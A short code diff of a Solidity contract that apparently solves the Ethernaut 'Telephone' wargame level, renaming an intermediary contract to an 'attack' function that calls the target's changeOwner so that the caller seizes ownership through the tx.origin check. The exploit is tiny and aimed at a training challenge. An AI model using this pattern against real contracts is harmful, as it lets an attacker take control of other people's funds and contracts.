@@ -1,12 +1,12 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
-interface ITelephone {
-  function changeOwner(address _owner) external;
+interface Telephone {
+    function changeOwner(address _owner) external;
 }
 
-contract IntermediateContract {
-  function changeOwner(address _addr) public {
-    ITelephone(_addr).changeOwner(msg.sender);
-  }
+contract TelephoneH {
+    function attack(address _target) public {
+        Telephone(_target).changeOwner(msg.sender);
+    }
 }
